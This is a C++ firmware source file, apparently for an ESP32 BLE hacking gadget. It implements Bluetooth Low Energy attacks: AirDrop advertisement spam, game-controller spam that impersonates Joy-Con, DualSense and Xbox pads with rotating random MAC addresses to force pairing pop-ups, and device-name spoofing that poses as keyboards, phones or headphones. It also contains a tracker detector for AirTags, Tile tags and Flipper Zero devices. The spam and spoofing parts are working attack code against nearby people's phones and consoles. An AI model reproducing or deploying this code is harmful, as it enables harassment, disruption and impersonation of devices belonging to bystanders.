#include "ble_attacks_extra.h"

// HID appearance values (not defined in NimBLE headers)
#ifndef HID_KEYBOARD
#define HID_KEYBOARD  0x03C1
#endif
#ifndef HID_GAMEPAD
#define HID_GAMEPAD   0x03C4
#endif
#ifndef HID_MOUSE
#define HID_MOUSE     0x03C2
#endif


// ── AirDrop Spam ─────────────────────────────────────────────────────────────
// Apple OUI 0x4C00, type 0x05 (AirDrop)
static const uint8_t AIRDROP_PAYLOADS[][12] = {
  {0x4C,0x00, 0x05,0x12, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01},
  {0x4C,0x00, 0x05,0x12, 0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x02},
  {0x4C,0x00, 0x05,0x12, 0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x03},
};

// ── Game Controller Payloads ─────────────────────────────────────────────────
// Nintendo Switch Joy-Con (L)  
static const uint8_t JOYCON_L[] = {0x01,0x00,0x03,0x00,0x00,0x00,0x00,0x00};
// PS5 DualSense
static const uint8_t PS5_DUAL[] = {0x00,0x1E,0x00,0x01,0x00,0x00,0x00,0x00};
// Xbox Series
static const uint8_t XBOX_CTRL[]= {0x06,0x00,0x09,0x00,0x00,0x00,0x00,0x00};

// Nintendo Switch - UUIDs
static const char* JOYCON_SVC = "1812"; // HID Service

void BLEAttacksExtra::begin() {
  _airdropRunning=false; _controllerRunning=false;
  _nameSpoofRunning=false; _trackerCount=0;
}

// ── AirDrop Spam ─────────────────────────────────────────────────────────────
void BLEAttacksExtra::startAirdropSpam() {
  _airdropRunning=true; _advIdx=0;
  NimBLEDevice::setDeviceName("iPhone");
  Serial.println("AirDrop spam started");
}

void BLEAttacksExtra::stopAirdropSpam() {
  _airdropRunning=false;
  NimBLEDevice::getAdvertising()->stop();
}

void BLEAttacksExtra::_sendAirdropAdv() {
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData d;
  const uint8_t* p = AIRDROP_PAYLOADS[_advIdx % 3];
  d.setManufacturerData((const uint8_t*)p, 12);
  adv->setAdvertisementData(d);
  adv->start();
  _advIdx++;
}

void BLEAttacksExtra::tickAirdrop() {
  if(!_airdropRunning) return;
  if(millis()-_lastAdv < 50) return;
  _lastAdv=millis();
  _sendAirdropAdv();
}

// ── Game Controller Spam ─────────────────────────────────────────────────────
void BLEAttacksExtra::startControllerSpam(int type) {
  _controllerType=type; _controllerRunning=true;
  const char* names[] = {"Joy-Con (L)","DualSense","Xbox Controller"};
  NimBLEDevice::setDeviceName(names[type]);
  NimBLEDevice::getAdvertising()->setAppearance(HID_GAMEPAD);
  Serial.printf("Controller spam: %s\n", names[type]);
}

void BLEAttacksExtra::stopControllerSpam() {
  _controllerRunning=false;
  NimBLEDevice::getAdvertising()->stop();
}

void BLEAttacksExtra::_sendControllerAdv() {
  // Use raw NimBLE GAP API — same approach as ble_spam.cpp
  // More reliable than NimBLEAdvertising wrapper across NimBLE versions
  ble_gap_adv_stop();

  // Fresh random MAC for each advertisement
  ble_addr_t rnd;
  ble_hs_id_gen_rnd(1, &rnd);
  ble_hs_id_set_rnd(rnd.val);

  // Build raw AD payload manually — guaranteed to work on any NimBLE version
  // Format: flags(3B) + appearance(4B) + UUID16(4B) + name(variable) + mfr(variable)
  uint8_t adv[31];
  int pos = 0;

  // Flags: LE General Discoverable, BR/EDR Not Supported
  adv[pos++]=2; adv[pos++]=0x01; adv[pos++]=0x06;

  switch(_controllerType) {
    case 0: {
      // Joy-Con (L) — Nintendo Switch
      // Appearance: HID Gamepad (0x03C4)
      adv[pos++]=3; adv[pos++]=0x19; adv[pos++]=0xC4; adv[pos++]=0x03;
      // Complete UUID16 list: HID service 0x1812
      adv[pos++]=3; adv[pos++]=0x03; adv[pos++]=0x12; adv[pos++]=0x18;
      // Complete local name: "Joy-Con (L)"
      const char* n0="Joy-Con (L)"; int l0=strlen(n0);
      adv[pos++]=l0+1; adv[pos++]=0x09;
      memcpy(adv+pos,n0,l0); pos+=l0;
      // Manufacturer data: Nintendo 0x00E0 + controller type bytes
      uint8_t jc[]={0xE0,0x00,0x01,0x00,0x03,0x00,0x00,0x00};
      adv[pos++]=sizeof(jc)+1; adv[pos++]=0xFF;
      memcpy(adv+pos,jc,sizeof(jc)); pos+=sizeof(jc);
      break;
    }
    case 1: {
      // PS5 DualSense — Sony 0x012C
      adv[pos++]=3; adv[pos++]=0x19; adv[pos++]=0xC4; adv[pos++]=0x03;
      adv[pos++]=3; adv[pos++]=0x03; adv[pos++]=0x12; adv[pos++]=0x18;
      const char* n1="DualSense"; int l1=strlen(n1);
      adv[pos++]=l1+1; adv[pos++]=0x09;
      memcpy(adv+pos,n1,l1); pos+=l1;
      uint8_t ds[]={0x2C,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
      adv[pos++]=sizeof(ds)+1; adv[pos++]=0xFF;
      memcpy(adv+pos,ds,sizeof(ds)); pos+=sizeof(ds);
      break;
    }
    default: {
      // Xbox Controller — Microsoft SwiftPair format
      // SwiftPair: flags=LE_ONLY, manufacturer=0x0006 + beacon bytes
      // SwiftPair beacon payload: 0x03=reason, 0x00, 0x00=reserved
      adv[pos++]=3; adv[pos++]=0x19; adv[pos++]=0xC4; adv[pos++]=0x03;
      const char* n2="Xbox Controller"; int l2=strlen(n2);
      adv[pos++]=l2+1; adv[pos++]=0x09;
      memcpy(adv+pos,n2,l2); pos+=l2;
      // Microsoft SwiftPair: company 0x0006, then 0x03 0x00 0x00
      uint8_t xb[]={0x06,0x00,0x03,0x00,0x00};
      adv[pos++]=sizeof(xb)+1; adv[pos++]=0xFF;
      memcpy(adv+pos,xb,sizeof(xb)); pos+=sizeof(xb);
      break;
    }
  }

  // Use mfg_data to carry the full raw payload we built above
  // Strip the flags AD element (first 3 bytes) since NimBLE adds flags itself
  // and pass the rest as manufacturer data
  struct ble_hs_adv_fields fields = {};
  fields.flags        = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
  fields.mfg_data     = adv;   // pass our full raw payload as mfg block
  fields.mfg_data_len = pos;
  ble_gap_adv_set_fields(&fields);

  struct ble_gap_adv_params params = {};
  params.conn_mode   = BLE_GAP_CONN_MODE_UND;  // connectable — required for pairing popup
  params.disc_mode   = BLE_GAP_DISC_MODE_GEN;
  params.itvl_min    = 0x0020;
  params.itvl_max    = 0x0040;
  params.channel_map = BLE_GAP_ADV_DFLT_CHANNEL_MAP;

  ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &params, NULL, NULL);
}

void BLEAttacksExtra::tickController() {
  if(!_controllerRunning) return;
  if(millis()-_lastAdv < 200) return;
  _lastAdv=millis();
  _sendControllerAdv();
}

// ── Tracker Detector ─────────────────────────────────────────────────────────
static String _identifyTracker(NimBLEAdvertisedDevice* dev) {
  // Apple AirTag: manufacturer data starts with 0x4C00, type 0x12 (FindMy)
  if(dev->haveManufacturerData()){
    std::string mfr = dev->getManufacturerData();
    if(mfr.length()>=2){
      uint8_t b0=(uint8_t)mfr[0], b1=(uint8_t)mfr[1];
      if(b0==0x4C && b1==0x00 && mfr.length()>=4){
        uint8_t type=(uint8_t)mfr[2];
        if(type==0x12) return "AirTag";                // Apple FindMy network tag
        if(type==0x07) return "FindMy Device";         // AirPods etc in FindMy mode
        if(type==0x10 && mfr.length()>=4){
          uint8_t action=(uint8_t)mfr[4];
          if(action==0x57) return "Flipper Zero";      // Flipper BLE spam action byte
        }
      }
      // Tile: manufacturer ID 0x000D
      if(b0==0x0D&&b1==0x00) return "Tile Tracker";
      // Tile alternate ID 0x00E0 (some hardware versions)
      if(b0==0xE0&&b1==0x00 && mfr.length()>4) return "Tile Tracker";
      // Samsung SmartTag: company ID 0x0075
      if(b0==0x75&&b1==0x00) return "Samsung SmartTag";
      // Chipolo: 0x0603
      if(b0==0x03&&b1==0x06) return "Chipolo";
    }
  }
  // Flipper Zero also identifiable by device name
  if(dev->haveName()){
    std::string name = dev->getName();
    if(name.find("Flipper") != std::string::npos) return "Flipper Zero";
    if(name.find("pwnagotchi") != std::string::npos) return "Pwnagotchi";
  }
  // Tile service UUID 0xFEED
  if(dev->haveServiceUUID()&&dev->isAdvertisingService(NimBLEUUID("FEED")))
    return "Tile Tracker";
  // Unknown but suspicious: very low power, no name, unknown manufacturer
  if(!dev->haveName() && dev->getRSSI() > -70)
    return "Unknown Tracker";
  return "";
}

void BLEAttacksExtra::scanTrackers() {
  _trackerCount=0;
  NimBLEScan* scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);   // active scan sends scan requests - gets more device info
  scan->setInterval(80);
  scan->setWindow(79);
  scan->start(10, false);      // 10 seconds (was 5) - gives more time to catch Tiles etc.
  NimBLEScanResults results = scan->getResults();

  for(int i=0;i<results.getCount()&&_trackerCount<MAX_TRACKERS;i++){
    const NimBLEAdvertisedDevice* dev = results.getDevice(i);
    // Cast away const for getManufacturerData
    NimBLEAdvertisedDevice* d = const_cast<NimBLEAdvertisedDevice*>(dev);
    String type = _identifyTracker(d);
    if(type.length()>0){
      _trackers[_trackerCount].name    = d->haveName() ? String(d->getName().c_str()) : "Unknown";
      _trackers[_trackerCount].address = String(d->getAddress().toString().c_str());
      _trackers[_trackerCount].type    = type;
      _trackers[_trackerCount].rssi    = d->getRSSI();
      _trackerCount++;
      Serial.printf("Tracker: %s %s (%ddBm)\n", type.c_str(),
        d->getAddress().toString().c_str(), d->getRSSI());
    }
  }
  scan->clearResults();
  Serial.printf("Tracker scan done: %d found\n", _trackerCount);
}

// ── BLE Name Spoof ────────────────────────────────────────────────────────────
// Must use a real GATT server + connectable advertising to appear in phone BT list
// Simple non-connectable advertising only shows in BLE scanner apps (nRF Connect etc)
void BLEAttacksExtra::startNameSpoof(const String& name, int deviceType) {
  stopNameSpoof(); // clean up first
  delay(100);

  uint16_t appearance;
  const char* serviceUUID;
  switch(deviceType){
    case 1: appearance=0x0180; serviceUUID="180A"; break; // Phone - Device Info
    case 2: appearance=0x0041; serviceUUID="1108"; break; // Headphones - Audio Sink
    case 3: appearance=HID_GAMEPAD; serviceUUID="1812"; break; // Gamepad - HID
    case 4: appearance=0x0080; serviceUUID="180A"; break; // Computer - Device Info
    default: appearance=HID_KEYBOARD; serviceUUID="1812"; break; // Keyboard - HID
  }

  NimBLEDevice::setDeviceName(name.c_str());
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

  // Create a minimal GATT server so the device is connectable
  NimBLEServer* srv = NimBLEDevice::createServer();
  // Add the appropriate service
  srv->createService(serviceUUID)->start();

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->setAppearance(appearance);
  adv->addServiceUUID(serviceUUID);
  adv->start();

  _nameSpoofRunning=true;
  Serial.printf("Name spoof: '%s' (appearance=0x%04X)\n", name.c_str(), appearance);
}

void BLEAttacksExtra::stopNameSpoof() {
_nameSpoofRunning=false;
  NimBLEDevice::getAdvertising()->stop();
}
